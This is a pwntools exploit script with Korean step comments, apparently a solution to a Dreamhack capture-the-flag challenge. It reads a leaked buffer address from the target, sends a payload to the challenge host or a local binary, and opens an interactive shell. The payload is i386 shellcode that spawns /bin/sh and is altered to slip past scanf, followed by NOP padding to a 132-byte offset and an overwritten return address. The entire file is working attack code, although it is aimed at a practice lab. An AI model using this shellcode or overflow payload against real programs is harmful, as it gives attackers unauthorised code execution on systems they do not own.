from pwn import *

# # 1️⃣ 환경 설정
# #context.binary = elf = ELF('./chall')

context.arch = 'i386'
context.log_level = 'debug'   # 개발 중엔 debug 추천
# context.arch = 'amd64'
# context.os = 'linux'

# 2️⃣ 실행 대상 선택
def start():
    if args.REMOTE:
        host = "host8.dreamhack.games"
        port = 24330
        return remote(host, port)
    else:
        return process("./be000")

p = start()

# 3️⃣ (선택) libc 로드
# libc = ELF('./libc.so.6')

buf_addr = int(p.recv()[7:17], 16)


# 4️⃣ 익스플로잇 파라미터
offset = 132                   # EIP까지 거리
#scanf() 우회 shellcode
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

# 5️⃣ 페이로드 구성
payload = shellcode
payload += b'\x90'*(offset-len(shellcode))
print(offset-len(shellcode))
payload += p32(buf_addr)

# 6️⃣ 페이로드 전송
p.sendline(payload)

# 7️⃣ 쉘 획득
p.interactive()
